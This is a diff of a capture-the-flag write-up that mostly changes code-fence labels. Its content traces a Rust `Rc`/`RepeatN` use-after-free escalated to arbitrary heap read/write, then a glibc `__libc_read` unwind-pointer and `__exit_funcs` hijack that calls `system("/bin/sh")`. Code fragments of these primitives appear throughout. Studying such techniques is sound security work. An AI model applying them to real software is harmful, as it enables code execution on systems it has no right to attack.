@@ -2,7 +2,7 @@
 
 ## first look
 Here is the source code for the challenge:
-```rs
+```rs filename="main.rs"
 #![feature(get_mut_unchecked)]
 
 use std::collections::BTreeMap;
@@ -135,7 +135,7 @@ fn main() {
 ```
 
 The challenge allows you to create `Exercise` structures and `Workout` structures
-```rs
+```rs open
 #[derive(Debug)]
 struct Exercise {
     name: Vec<u8>,
@@ -148,7 +148,7 @@ struct Workout {
 }
 ```
 and always wraps `Exercises` in a `Rc`.
-```rs
+```rs open
                 let exercise: Exercise = Exercise { name, description };
                 exercises.insert(name2, Rc::new(exercise));
                 println!("Exercise added!");
@@ -161,7 +161,7 @@ refcount is incremented, and when dropped the refcount is decremented. Modifying
 1 owner and not breaking rusts shared mutability rules.
 
 The internal structure of `Rc` looks like this:
-```c
+```c open
 struct RcBox<T> {
     size_t strong;
     size_t weak;
@@ -178,7 +178,7 @@ This is safe because `Rc` disallows cloning once the refcount reaches 0.
 
 ## sus code 1
 Immediately this part of the code looks suspicious:
-```rs
+```rs open
             b"4" => {
                 let name = input.ask("Enter the name of the exercise you want to edit: ");
                 if let Some(exercise) = exercises.get_mut(name) {
@@ -212,7 +212,7 @@ What does `RepeatN` do? `RepeatN` is an iterator type that returns the wrapped v
 The issues arises from how `Rc` interacts with `RepeatN` when the repeat count is 0.
 
 This is the poc segfault provided by the github issue:
-```rs
+```rs open
 use std::rc::Rc;
 fn main() {
     let mut c = [0; 100];
@@ -238,7 +238,7 @@ useful field in the first qword that allows for further exploitation.
 It turns out that the backing memory for the `Workout->exercises` vector is allocated in a 0x50 sized chunk!
 
 The backing memory looks like this:
-```
+``` open
          ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ uaf increment on this value
  +0x00 | pointer to RcBox<Exercise> | ━┓
  +0x08 | repeat count               | ━┻━━━ workout->exercises[0]
@@ -253,7 +253,7 @@ another `RepeatN`, escalates the bug to arbitrary increment in the heap.
 
 ## arbitrary heap read/write
 With arbitrary increment can now modify the backing pointer of the `Exercise->description` field.
-```rs
+```rs open
 struct Exercise {
     name: Vec<u8>,
     description: Vec<u8>,
@@ -262,7 +262,7 @@ struct Exercise {
 Modifying `Exercise("A")->description` to point to `Exercise("B")->description` escalates our arbitrary increment bug to arbitrary heap read/write. Using
 `Exercise("A")` to modify the description field of `Exercise("B")` to an arbitrary address, then read/writing from `Exercise("B")` to achieve arbitrary
 read/write.
-```rs
+```rs open
             b"4" => {
                 let name = input.ask("Enter the name of the exercise you want to edit: ");
                 if let Some(exercise) = exercises.get_mut(name) {
@@ -288,7 +288,7 @@ which crashes the program when main returns.
 
 There is another novel method which I discovered while playing another ctf.
 The full call chain looks like:
-```c
+```c open
 __libc_read
 ┗━ SYSCALL_CANCEL
   ┗━ LIBC_CANCEL_ASYNC
@@ -301,7 +301,7 @@ __libc_read
 
 It only depends on the program using the `__libc_read` function.
 Breaking on `__libc_read` and running the challenge shows that `__libc_read` is used by rust stdlib!
-```rs
+```rs open
 #0  __GI___libc_read (fd=0x0, buf=0x5555555c2b80, nbytes=0x2000)
     at ../sysdeps/unix/sysv/linux/read.c:25
 #1  0x000055555559716e in std::sys::pal::unix::fd::FileDesc::read_buf ()
@@ -334,7 +334,7 @@ Breaking on `__libc_read` and running the challenge shows that `__libc_read` is 
 [`UNWIND_LINK_PTR`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/generic/unwind-link.h#L64)
 
 Here are the necessary requirements to trigger the call an arbitrary function (in this case exit):
-```rs
+```rs open
 *((fs_base + 0x308) as *mut u64) = 8;
 libc.global.ptr__Unwind_ForcedUnwind = PTR_MANGLE(exit);
 libc.global_libgcc_handle = 1 as usize;
@@ -342,7 +342,7 @@ libc.__libc_single_threaded_internal = 0 as u8;
 ```
 
 Also setup a destructor to trigger a shell:
-```rs
+```rs open
 libc.__exit_funcs[0].fns[0].func.on.fn = PTR_MANGLE(system);
 libc.__exit_funcs[0].fns[0].func.on.arg = &"/bin/sh";
 ```
@@ -350,7 +350,7 @@ libc.__exit_funcs[0].fns[0].func.on.arg = &"/bin/sh";
 
 
 ## full solve
-```py
+```py open filename="solve.py"
 from pwn import *
 from pwnc.gdb.launch import attach
 import builtins
